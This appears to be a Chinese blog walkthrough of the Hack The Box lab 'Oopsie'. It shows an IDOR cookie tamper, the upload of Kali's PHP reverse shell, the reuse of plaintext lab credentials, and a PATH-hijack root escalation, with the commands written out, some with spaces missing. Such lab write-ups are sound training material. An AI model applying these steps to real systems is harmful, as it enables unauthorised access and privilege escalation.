> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TWCtKKVHx6a4LrKo1u_07Q)

**hackthebox oopsie**

![](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbbwWeOCucCdMpZsP69RCqnEGwEibyJ6OrSjJGjHrpEXfj2LPibdtnFdMg/640?wx_fmt=gif)

**1** **信息收集**

固定 IP：10.10.10.28

Nmap 扫端口详情

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbxJyDsU4Nub2Dia7e8OXDXO6aAzTzuOWVQBlWqSD2TXnyPybic6Svhlsg/640?wx_fmt=png)

访问 80 端口查看信息

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbcP4D1fA8FDO4hzP7gmev6u5hEXF4wl38XJ8rErPJAOpyib24Cfq0XyA/640?wx_fmt=png)

看了看这些网页，发现了有用的就是这个

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbzAH7icJ67hAlicjX6CB0iaVQEUicKE3FfCytcciaO9zqic3G3v4aQxftGrww/640?wx_fmt=png)

翻译后

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbby5icfic0rdk9gZQD9ibckSlWnU2UOo0S0tO1iavUgA8uxJck1WMh6p2fQ/640?wx_fmt=png)

这里我们扫目录没扫出什么东西，之后去网页源码看了看发现了登录页

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbgnrzXtsIrrmQiaH3DbS7a7ZHyiaiakPwFjdw924XTicnLjCW1qgicRqpxmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbzsLkgiaHTDg3LpAdy8TTw9ediclqUtnfHiceia8AZCr30ibkqTZGHNXuwKg/640?wx_fmt=png)

因为这个初学者靶机是连着一块的所以密码是上一节的管理员密码 MEGACORP_4dm1n!!，看不懂英文是真的头疼

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbiaEuYs2zb689ZaYd4PnDfBz4jhDPiaHYO2yAf9Zt63AEkSfsbibUKAHYg/640?wx_fmt=png)

来到上传界面说要超级管理员才行

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbjE2ANCyDuW6TqWP6opX5jXwkVdWpjd1Fjo4LZzNb5OSACHrXueNDBQ/640?wx_fmt=png)

**2** **越权漏洞**

看到有个界面是管理员记录，这明晃晃的 id=1 啊，兄弟们懂我意思吧

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbAqlB9DHOpfxbbmic19MnMorbe7YSqp0DdJmCXU30bX6OmhuGzfx8ZXg/640?wx_fmt=png)

我先尝试修改了 id 后边的参数，直到 4 出现了一个用户，那肯定有 sql 注入越权漏洞了

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbzNhquVl96H7sO9k0icAxBlOJhTQGwhnFrjNutiba9gz9rRWtZBfpmkGQ/640?wx_fmt=png)

之后我们抓个包分析一波，可以看到除了 id 就是 cookie 最简单的 user 加 role，那我们接下来就是要获取超级管理员的 userid 和 role 了。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbv3CXQdRVyfNvLX4z6JWKgRwQViavNtmYQ9mNibV1ggOt0qsSdJgoXNxA/640?wx_fmt=png)

既然修改 id 就可以爆出账户密码，那我们也不用太麻烦了，直接上 burp 爆破，在那之前我们先生成下字典

```
for i in `seq 1 100`; do echo $i >>2.txt;done;
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbWBfDAWmgiaKSUuCjHnY42NULa2vGic1btC8lxdGz5hhC1s19FTFGeQTw/640?wx_fmt=png)

这里忽略掉一些过程我们直接看 burp 跑的结果

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIb76FYeNsyyV4FrzcTxszDicV8Cl6iaAia4tZVDOFcMoq60zGahQWxSCOTA/640?wx_fmt=png)

访问找到超级管理员

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIb02upiaEpoCQS95TAgn50x7UA0Md2cXGGXPia53ZeIsj99mKKk8ymrAmg/640?wx_fmt=png)

记好 id 和用户名 86575 super admin 抓包修改下 userid 和 role

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIb4cw5LE5yozXqSrq7xKKfcJj7LOBtocTCZbib7zHMQZQpaXicEJ7CGlyQ/640?wx_fmt=png)

成功越权

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbHxgNXEkN47ZAib0u9vTKcCVlzR7W3oGqh04qIykmEiaJQ56bJMqXp0xQ/640?wx_fmt=png)

这里我直接用 kali 自带的反弹 shell 了

**3** **反弹交互 shell**

cp/usr/share/webshells/php/php-reverse-shell.php ~/ 桌面

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbcwRAapl9FXyCjImdhh7AiafoXTU3VpTW8LgVR9N4zibMTcIbTQIqiadGg/640?wx_fmt=png)

打开文件修改下 ip，改成自己的

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIb8Gr2EeG9pUvs9YYIrVLWNfknzDnfLgLQKjyj0yzP5HKPPILg99NnPw/640?wx_fmt=png)

先开启监听做好准备工作

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIb2J7iaR0FOVJGJMxjmvpbcDA7RxEx3gRMGpLcHoicq4ia1KRJ02KqlXQYg/640?wx_fmt=png)

之后上传，还是要抓包把 user 和 role 改成超级管理员的值

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbVoQAIP19uuTIfq6Aj4vMmApjb8XLWLWrAsu5NqKYo8s3EmSDNcxQYA/640?wx_fmt=png)

这里我们不知道传哪里去了，扫下目录看看

python3dirsearch.py -u 10.10.10.28 -e php

根据老套路应该去了 uploads 了

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbrEpwAIWt50AEWLwEx9ibnUhysdiaaSUY1aiaQVEDdwOXKiaEeMRc1e8NpQ/640?wx_fmt=png)

访问下文件

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbIIicMdZjQfxh1s71BJs672058My9DyIiau7P6frUkvBMkhtfGKe8rv9A/640?wx_fmt=png)

反弹监听

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbd9u4alwKOJDzVH0L2nYKQRTDJDo7DPWcvcC7cGdZk1qLiaUJ3QRr4pg/640?wx_fmt=png)

这个时候我们要升级 shell，因为 netcat 为非交互模式，下方为原理解释

交互式模式就是 shell 等待你的输入，并且立即执行你提交的命令，退出后才终止

非交互式模式就是以 shellscript 方式执行，shell 不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止

用 netcat 获得的 shell 是非交互式的，不能传递 tab 来进行补全，不能使用 su、nano，也不能执行 ctrl+c 等命令，所以我们需要升级为交互式的 shell

SHELL=/bin/bashscript -q /dev/null

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbZFLibhiciaheVWlcMCagLbgWmwebuhMaKyLgdWZPjoIawCFuXMDCg0W1Q/640?wx_fmt=png)

经过各种翻目录找到了数据库用户和密码

'robert','M3g4C0rpUs3r!’

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbqeX0OHNxrSAkREIG3dkHKEdpC3TXTdypLrIrcCud5KvBU0GgI6JdiaA/640?wx_fmt=png)

切换到 robert 用户

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIb3EJ9d6FPA4mVqymkq6aqst4QvnPib1dP4VEFHKf4Q73T9iaUrAvdg4Kg/640?wx_fmt=png)

也是在他老家找到了 user 的 flag

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIboeIQhTicYxsQF8fibjYaO0AD8IbmOic9H3KAVEdpVSaVa9RiaV8KTQJ2Rw/640?wx_fmt=png)

**4****Linux 日常 sudo 提权**

先看看有没有 root 权限的文件

find/ -type f -group bugtracker 2>/dev/null //-type f 为查找普通文档，-groupbugtracker 限定查找的组为 bugtracker，2>/dev/null 将错误输出到黑洞（不显示）

ls-al /usr/bin/bugtracker //-al 以长格式方式显示并且显示隐藏文件

可以看到有一个文件在这个目录下有 root 权限

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbXdK8verdmX0L4l2ev56dPC2SPHmQuGAD7icRM9HdibebCuaTCUb9jeyQ/640?wx_fmt=png)

打开看看如何运行的，看这种文件就是找关键词，看见图中 root 了对吧，正常情况是没法访问 root 目录的，之后文件运行又是根据用户输入的 id 值访问 root 目录下文件

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbpDI24apRZh2fPKNkNQ9OZRK54XjiclmG7GwnZVMa5EJia3wVjQ3gDA6g/640?wx_fmt=png)

这个时候我们设置环境变量，加上恶意的 cat 指令

exportPATH=/tmp:$PATH // 将 /tmp 目录设置为环境变量

cd/tmp/// 切换到 /tmp 目录下

echo'/bin/sh' > cat// 在此构造恶意的 cat 命令

chmod+x cat// 赋予执行权限

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbmuficzibCDZHHgluZMlhUCL1GjCpDNqVp18S6h9tQia9ZpMLLQJWoYUog/640?wx_fmt=png)

执行目标文件，获取 root 权限

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIb1b7ib0DJHsk98veiagovLvKS5RasIvwYsZJXqsL22Dt54SbEkIlKRaVg/640?wx_fmt=png)

打开 root 目录拿到 flag

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbctFJmUniaC6icW7H3uhziaicAWUPIsfBf3hibVrn2GJnn3mdSZXn6d3EQZA/640?wx_fmt=png)

**5** **关注公众号**

**公众号不定期更新安全文章和视频**

**欢迎前来关注**

**![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADEw5ZZRLbEo7qUDgaftBIbSQCjuZPIvu2PQcicvNR4w01ve298j4iapiaSIr8A7dwXv8icUlbxBeKhibQ/640?wx_fmt=jpeg)**